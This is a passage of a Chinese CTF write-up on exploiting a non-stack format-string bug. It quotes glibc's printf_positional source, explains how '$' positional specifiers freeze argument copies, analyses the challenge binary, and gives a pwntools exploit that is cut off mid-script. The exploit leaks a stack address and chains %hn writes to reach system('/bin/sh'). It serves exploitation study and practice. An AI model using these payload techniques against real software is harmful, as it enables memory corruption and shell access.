&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __HAVE_FLOAT128_UNLIKE_LDBL</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((mode_flags &amp; PRINTF_LDBL_USES_FLOAT128) != <span class="number">0</span>)</span><br><span class="line">  args_value[cnt].pa_float128 = va_arg (*ap_savep, <span class="type">_Float128</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  args_value[cnt].pa_long_double = va_arg (*ap_savep, <span class="type">long</span> <span class="type">double</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> PA_STRING:<span class="comment">/* All pointers are the same */</span></span><br><span class="line">      <span class="keyword">case</span> PA_WSTRING:<span class="comment">/* All pointers are the same */</span></span><br><span class="line">T (PA_POINTER, pa_pointer, <span class="type">void</span> *);</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> T</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">if</span> ((args_type[cnt] &amp; PA_FLAG_PTR) != <span class="number">0</span>)</span><br><span class="line">  args_value[cnt].pa_pointer = va_arg (*ap_savep, <span class="type">void</span> *);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (__glibc_unlikely (__printf_va_arg_table != <span class="literal">NULL</span>)</span><br><span class="line"> &amp;&amp; __printf_va_arg_table[args_type[cnt] - PA_LAST] != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    args_value[cnt].pa_user = alloca (args_size[cnt]);</span><br><span class="line">    (*__printf_va_arg_table[args_type[cnt] - PA_LAST])</span><br><span class="line">      (args_value[cnt].pa_user, ap_savep);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">memset</span> (&amp;args_value[cnt], <span class="number">0</span>, <span class="keyword">sizeof</span> (args_value[cnt]));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line"><span class="comment">/* Error case.  Not all parameters appear in N$ format</span></span><br><span class="line"><span class="comment">   strings.  We have no way to determine their type.  */</span></span><br><span class="line">assert ((mode_flags &amp; PRINTF_FORTIFY) != <span class="number">0</span>);</span><br><span class="line">__libc_fatal (<span class="string">&quot;*** invalid %N$ use detected ***\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Now walk through all format specifiers and process them.  */</span></span><br><span class="line">  <span class="keyword">for</span> (; (<span class="type">size_t</span>) nspecs_done &lt; nspecs; ++nspecs_done)</span><br><span class="line">    &#123;</span><br><span class="line">      STEP4_TABLE;</span><br><span class="line"></span><br><span class="line">      <span class="type">int</span> is_negative;</span><br><span class="line">      <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> longlong;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> word;</span><br><span class="line">      &#125; number;</span><br><span class="line">      <span class="type">int</span> base;</span><br><span class="line">      CHAR_T *<span class="built_in">string</span>;<span class="comment">/* Pointer to argument string.  */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Fill variables from values in struct.  */</span></span><br><span class="line">      <span class="type">int</span> alt = specs[nspecs_done].info.alt;</span><br><span class="line">      <span class="type">int</span> space = specs[nspecs_done].info.space;</span><br><span class="line">      <span class="type">int</span> left = specs[nspecs_done].info.left;</span><br><span class="line">      <span class="type">int</span> showsign = specs[nspecs_done].info.showsign;</span><br><span class="line">      <span class="type">int</span> group = specs[nspecs_done].info.group;</span><br><span class="line">      <span class="type">int</span> is_long_double __attribute__ ((unused))</span><br><span class="line">= specs[nspecs_done].info.is_long_double;</span><br><span class="line">      <span class="type">int</span> is_short = specs[nspecs_done].info.is_short;</span><br><span class="line">      <span class="type">int</span> is_char = specs[nspecs_done].info.is_char;</span><br><span class="line">      <span class="type">int</span> is_long = specs[nspecs_done].info.is_long;</span><br><span class="line">      <span class="type">int</span> width = specs[nspecs_done].info.width;</span><br><span class="line">      <span class="type">int</span> prec = specs[nspecs_done].info.prec;</span><br><span class="line">      <span class="type">int</span> use_outdigits = specs[nspecs_done].info.i18n;</span><br><span class="line">      <span class="type">char</span> pad = specs[nspecs_done].info.pad;</span><br><span class="line">      CHAR_T spec = specs[nspecs_done].info.spec;</span><br><span class="line"></span><br><span class="line">      CHAR_T *workend = work_buffer + WORK_BUFFER_SIZE;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Fill in last information.  */</span></span><br><span class="line">      <span class="keyword">if</span> (specs[nspecs_done].width_arg != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Extract the field width from an argument.  */</span></span><br><span class="line">  specs[nspecs_done].info.width =</span><br><span class="line">    args_value[specs[nspecs_done].width_arg].pa_int;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (specs[nspecs_done].info.width &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* If the width value is negative left justification is</span></span><br><span class="line"><span class="comment">       selected and the value is taken as being positive.  */</span></span><br><span class="line">    &#123;</span><br><span class="line">      specs[nspecs_done].info.width *= <span class="number">-1</span>;</span><br><span class="line">      left = specs[nspecs_done].info.left = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  width = specs[nspecs_done].info.width;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (specs[nspecs_done].prec_arg != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Extract the precision from an argument.  */</span></span><br><span class="line">  specs[nspecs_done].info.prec =</span><br><span class="line">    args_value[specs[nspecs_done].prec_arg].pa_int;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (specs[nspecs_done].info.prec &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* If the precision is negative the precision is</span></span><br><span class="line"><span class="comment">       omitted.  */</span></span><br><span class="line">    specs[nspecs_done].info.prec = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  prec = specs[nspecs_done].info.prec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Process format specifiers.  */</span></span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">extern</span> printf_function **__printf_function_table;</span><br><span class="line">  <span class="type">int</span> function_done;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (spec &lt;= UCHAR_MAX</span><br><span class="line">      &amp;&amp; __printf_function_table != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __printf_function_table[(<span class="type">size_t</span>) spec] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="type">void</span> **ptr = alloca (specs[nspecs_done].ndata_args</span><br><span class="line"> * <span class="keyword">sizeof</span> (<span class="type">const</span> <span class="type">void</span> *));</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Fill in an array of pointers to the argument values.  */</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; specs[nspecs_done].ndata_args;</span><br><span class="line">   ++i)</span><br><span class="line">ptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Call the function.  */</span></span><br><span class="line">      function_done = __printf_function_table[(<span class="type">size_t</span>) spec]</span><br><span class="line">(s, &amp;specs[nspecs_done].info, ptr);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (function_done != <span class="number">-2</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* If an error occurred we don&#x27;t have information</span></span><br><span class="line"><span class="comment">     about # of chars.  */</span></span><br><span class="line">  <span class="keyword">if</span> (function_done &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Function has set errno.  */</span></span><br><span class="line">      done = <span class="number">-1</span>;</span><br><span class="line">      <span class="keyword">goto</span> all_done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  done_add (function_done);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  JUMP (spec, step4_jumps);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_data args_value[specs[nspecs_done].data_arg]</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_int() process_arg_data.pa_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_long_int() process_arg_data.pa_long_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_long_long_int() process_arg_data.pa_long_long_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_pointer() process_arg_data.pa_pointer</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_string() process_arg_data.pa_string</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_unsigned_int() process_arg_data.pa_u_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_unsigned_long_int() process_arg_data.pa_u_long_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_unsigned_long_long_int() process_arg_data.pa_u_long_long_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_wchar_t() process_arg_data.pa_wchar</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> process_arg_wstring() process_arg_data.pa_wstring</span></span><br><span class="line">  process_arg ();</span><br><span class="line">  process_string_arg ();</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_data</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_long_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_long_long_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_pointer</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_string</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_unsigned_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_unsigned_long_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_unsigned_long_long_int</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_wchar_t</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> process_arg_wstring</span></span><br><span class="line"></span><br><span class="line">  LABEL (form_float):</span><br><span class="line">  LABEL (form_floathex):</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">void</span> *ptr</span><br><span class="line">      = (<span class="type">const</span> <span class="type">void</span> *) &amp;args_value[specs[nspecs_done].data_arg];</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely ((mode_flags &amp; PRINTF_LDBL_IS_DBL) != <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">specs[nspecs_done].data_arg_type = PA_DOUBLE;</span><br><span class="line">specs[nspecs_done].info.is_long_double = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    SETUP_FLOAT128_INFO (specs[nspecs_done].info);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> function_done</span><br><span class="line">      = __printf_fp_spec (s, &amp;specs[nspecs_done].info, &amp;ptr);</span><br><span class="line">    <span class="keyword">if</span> (function_done &lt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Error in print handler; up to handler to set errno.  */</span></span><br><span class="line">done = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">goto</span> all_done;</span><br><span class="line">      &#125;</span><br><span class="line">    done_add (function_done);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  LABEL (form_unknown):</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">const</span> <span class="type">void</span> **ptr;</span><br><span class="line"></span><br><span class="line">    ptr = alloca (specs[nspecs_done].ndata_args</span><br><span class="line">  * <span class="keyword">sizeof</span> (<span class="type">const</span> <span class="type">void</span> *));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fill in an array of pointers to the argument values.  */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; specs[nspecs_done].ndata_args; ++i)</span><br><span class="line">      ptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Call the function.  */</span></span><br><span class="line">    function_done = printf_unknown (s, &amp;specs[nspecs_done].info,</span><br><span class="line">    ptr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If an error occurred we don&#x27;t have information about #</span></span><br><span class="line"><span class="comment">       of chars.  */</span></span><br><span class="line">    <span class="keyword">if</span> (function_done &lt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Function has set errno.  */</span></span><br><span class="line">done = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">goto</span> all_done;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    done_add (function_done);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Write the following constant string.  */</span></span><br><span class="line">      outstring (specs[nspecs_done].end_of_fmt,</span><br><span class="line"> specs[nspecs_done].next_fmt</span><br><span class="line"> - specs[nspecs_done].end_of_fmt);</span><br><span class="line">    &#125;</span><br><span class="line"> all_done:</span><br><span class="line">  scratch_buffer_free (&amp;argsbuf);</span><br><span class="line">  scratch_buffer_free (&amp;specsbuf);</span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解析流程"><a href="#解析流程" class="headerlink" title="解析流程"></a>解析流程</h2><h3 id="无-“-”符"><a href="#无-“-”符" class="headerlink" title="无 “$”符"></a>无 “$”符</h3><p>没有”$”符，程序就会在这里跳来跳起，完成全部解析<br><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250811180756048.png"></p><p>我们来表中是什么<br><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250811181243402.png" alt="image.png"></p><p>关于LABEL (form_number)的源码在上文中有，这里不再赘述。它的功能就顺序往参数里写数据，并且是实时的。</p><p>关于LABEL(unknown)的源码上文也有，功能也就是检测当前字符是否为终止符，是则结束，不是则继续。</p><h3 id="有”-”-符"><a href="#有”-”-符" class="headerlink" title="有”$” 符"></a>有”$” 符</h3><p>在vfprintf的do循环中会获取当前字符，并进行一次跳表的寻找找到对应字符的操作函数，跳转执行。<br>如果遇到<code>$</code>符，或者遇到<code>unknown</code>的字符，就会调用<code>printf_positional</code>,去做复杂的字符串的解析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">union</span> <span class="title">printf_arg</span> *<span class="title">args_value</span>;</span></span><br><span class="line"> <span class="type">int</span> *args_size;</span><br><span class="line"> <span class="type">int</span> *args_type;</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="comment">/* Calculate total size needed to represent a single argument</span></span><br><span class="line"><span class="comment">      across all three argument-related arrays.  */</span></span><br><span class="line">   <span class="type">size_t</span> bytes_per_arg</span><br><span class="line">     = <span class="keyword">sizeof</span> (*args_value) + <span class="keyword">sizeof</span> (*args_size) + <span class="keyword">sizeof</span> (*args_type);</span><br><span class="line">   <span class="keyword">if</span> (!scratch_buffer_set_array_size (&amp;argsbuf, nargs, bytes_per_arg))</span><br><span class="line">     &#123;</span><br><span class="line">done = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">goto</span> all_done;</span><br><span class="line">     &#125;</span><br><span class="line">   args_value = argsbuf.data;</span><br><span class="line">   <span class="comment">/* Set up the remaining two arrays to each point past the end of</span></span><br><span class="line"><span class="comment">      the prior array, since space for all three has been allocated</span></span><br><span class="line"><span class="comment">      now.  */</span></span><br><span class="line">   args_size = &amp;args_value[nargs].pa_int;</span><br><span class="line">   args_type = &amp;args_size[nargs];</span><br><span class="line">   <span class="built_in">memset</span> (args_type, (mode_flags &amp; PRINTF_FORTIFY) != <span class="number">0</span> ? <span class="string">&#x27;\xff&#x27;</span> : <span class="string">&#x27;\0&#x27;</span>,</span><br><span class="line">    nargs * <span class="keyword">sizeof</span> (*args_type));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* XXX Could do sanity check here: If any element in ARGS_TYPE is</span></span><br><span class="line"><span class="comment">    still zero after this loop, format is invalid.  For now we</span></span><br><span class="line"><span class="comment">    simply use 0 as the value.  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Fill in the types of all the arguments.  */</span></span><br><span class="line"> <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; nspecs; ++cnt)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="comment">/* If the width is determined by an argument this is an int.  */</span></span><br><span class="line">     <span class="keyword">if</span> (specs[cnt].width_arg != <span class="number">-1</span>)</span><br><span class="line">args_type[specs[cnt].width_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* If the precision is determined by an argument this is an int.  */</span></span><br><span class="line">     <span class="keyword">if</span> (specs[cnt].prec_arg != <span class="number">-1</span>)</span><br><span class="line">args_type[specs[cnt].prec_arg] = PA_INT;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">switch</span> (specs[cnt].ndata_args)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">/* No arguments.  */</span></span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="comment">/* One argument; we already have the</span></span><br><span class="line"><span class="comment">   type and size.  */</span></span><br><span class="line">  args_type[specs[cnt].data_arg] = specs[cnt].data_arg_type;</span><br><span class="line">  args_size[specs[cnt].data_arg] = specs[cnt].size;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">  <span class="comment">/* We have more than one argument for this format spec.</span></span><br><span class="line"><span class="comment">     We must call the arginfo function again to determine</span></span><br><span class="line"><span class="comment">     all the types.  */</span></span><br><span class="line">  (<span class="type">void</span>) (*__printf_arginfo_table[specs[cnt].info.spec])</span><br><span class="line">    (&amp;specs[cnt].info,</span><br><span class="line">     specs[cnt].ndata_args, &amp;args_type[specs[cnt].data_arg],</span><br><span class="line">     &amp;args_size[specs[cnt].data_arg]);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在这段代码中，<code>printf_positional</code> 把相关的参数 保存成了副本。后续对格式化字符串的参数处理，都是通过副本做处理。<br>所以说，以第一个<code>$</code>符或者<code>unknown</code>的字符为界，前面通过<code>vfprintf_internal</code> 解析处理，后面通过<code>printf_positional</code>处理。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>如果我们想一次格式化字符串去栈上做任意地址写，需要利用这个特性。假设我们有一个非栈上格式化字符串的机会，栈上存在如下数据：<br>$$<br>\begin{flalign*}<br>A &amp;&#x3D;&gt; B &#x3D;&gt; C &amp; \\<br>B &amp;&#x3D;&gt; C &amp; \\<br>&amp;\ldots &amp; \\<br>D &amp;&#x3D;&gt; E &amp;<br>\end{flalign*}<br>$$<br>如果我们需要修改<code>D</code>的值为<code>F</code>, 那么我们必须先把<code>B</code> 的值改<code>D</code>，然后在通过B这个偏移去修改。 假设A 的偏移为8，<br>这部分<code>fmt</code> 就是 :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&quot;%p&quot;</span>*<span class="number">6</span></span><br><span class="line">payload1 += <span class="string">&quot;%&#123;&#125;c%hn&quot;</span>.<span class="built_in">format</span>(D_low-<span class="number">60</span>).encode()</span><br><span class="line">payload1 += <span class="string">&quot;%&#123;&#125;c%9$hn&quot;</span>.<span class="built_in">format</span>(E_low-D_low+<span class="number">60</span>).encode()</span><br><span class="line"><span class="comment"># 如果用$符写，当然不能这么用，因为会使第二次写入失败</span></span><br><span class="line"><span class="comment"># 以下是反面教材，属于想得很美</span></span><br><span class="line">payload2 = <span class="string">&quot;%&#123;&#125;c%8$hn&quot;</span>.<span class="built_in">format</span>(D_low).encode()</span><br><span class="line">payload2 += <span class="string">&quot;%&#123;&#125;c%9$hn&quot;</span>.<span class="built_in">format</span>(E_low-D_low).encode()</span><br></pre></td></tr></table></figure><p>根据上文的介绍，我们不难理解，printf 在处理这些字符串其实是按顺序来的。第一个<code>%n</code>两个payload都是可以修改成功的，但是第二个<code>%n</code> payload2 是 写不上的。或者说它其实是往<code>C</code>中写了数据。<br>因为<code>$</code>符，让payload2 在第一个<code>%n</code>处就已经把所有的参数都固定了，修改后，栈上是变量，但是后续的写入，不会同步这个变化。而payload1是在第二个 <code>%n</code> 才固定参数，这个时候，第9个参数已经变了，所以可以写成功。</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一个平常的下午，学妹让我帮忙看看题。起初我不以为意，吃完晚饭才开始看。然后就写到了1点钟。感觉自己的思路还是太丑陋，不优雅。于是想起了一个格式化字符串的极限利用。<br><a href="https://zikh26.github.io/posts/a523e26a.html#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4">一次有趣的格式化字符串漏洞利用 | ZIKH26’s Blog</a><br>开始研究</p><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810223742657.png" alt="main函数"></p><p>功能非常的简单，</p><ol><li>循环3次调用talk，需要控制flag的值（后续再看）</li><li>atk判断，成功则调用he()</li></ol><p>先看he()里有啥。</p><h3 id="he函数"><a href="#he函数" class="headerlink" title="he函数"></a>he函数</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224024236.png" alt="he函数"></p><p>这里建议看汇编，</p><ol><li>system的出现，让人思路开朗</li><li>command是<code>-0xe</code>，也就是要控制<code>rbp-0xe</code></li><li>注意lea 和 mov 的区别，通过这个方法的话，必须要把”&#x2F;bin&#x2F;sh”写在栈上</li></ol><p>一般揣测一下出题人的想法，肯定是最后要返回到这里了。</p><h3 id="talk函数"><a href="#talk函数" class="headerlink" title="talk函数"></a>talk函数</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224845139.png" alt="talk"></p><p>重点来了，</p><ol><li>非栈上格式化字符串,每次只读0x20字节</li><li>flag初始是0,talk会把它变成1,想办法置0</li><li>返回到了my_read,继续追踪</li></ol><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225109891.png" alt="my_read"></p><p>看看bss段上,这些变量的位置</p><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225315432.png" alt="bss"></p><p>atk在flag上面,那么就可以利用my_read把flag设置成0 ,只要每次都输入8字节就可以.</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>1.通过格式化字符串去修改command,和返回地址.让程序最后跳转执行,getshell<br>2.但是，常规的思路，需要的格式化次数不止3次。</p><blockquote><ol><li>%p泄露栈地址</li><li>把rbp链入（因为此题目栈上无<code>诸葛连弩</code>，要自己建）</li><li>修改啥也不行，没次数了</li></ol></blockquote><p>3.所以笔者在这里用了一些奇怪的方法。</p><blockquote><ol><li>笔者开始想，因为<code>i</code>也是在栈上的，所以我可以修改<code>i</code>来增加次数</li><li>但是，恰因如此，如果修改rbp，那么会影响下次循环对<code>i</code>的判断，</li><li>于是笔者又注意到栈上有很多0，控制好rbp，其实也是可以的 。</li><li>所以在笔者的精心的构造下，完成了10次格式化字符串的修改。</li><li>比较重要的就是两个$n的运用。一个把<code>sh</code>写在了栈上,一个把最后修改返回地址前的,rbp-0x4 修改好了.</li></ol></blockquote><p>4.笔者又再反思,可不可以利用格式化字符串的极限,两次把所需的改完.答案是可以.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="10次格式化字符串"><a href="#10次格式化字符串" class="headerlink" title="10次格式化字符串"></a>10次格式化字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> esy <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class="line">io,elf=loadfile(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 leak stack</span></span><br><span class="line">payload=<span class="string">b&quot;%8$p&quot;</span></span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">rbp=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x20</span></span><br><span class="line"><span class="comment">#logv(&quot;rbp&quot;,hex(rbp))</span></span><br><span class="line">rbp_low=rbp &amp; <span class="number">0xffff</span></span><br><span class="line">fmt_low=<span class="number">0x4040c0</span> &amp; <span class="number">0xffff</span></span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#2，3 rbp链入,修改rbp </span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%6$hn&#x27;</span>.<span class="built_in">format</span>(rbp_low).encode()</span><br><span class="line">io.sendafter(<span class="string">&quot;...\n&quot;</span>,payload)</span><br><span class="line">io.sendafter(<span class="string">&quot;battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c%47$hn\x00&#x27;</span>.<span class="built_in">format</span>(rbp_low+<span class="number">0x38</span>).encode()</span><br><span class="line">io.sendafter(<span 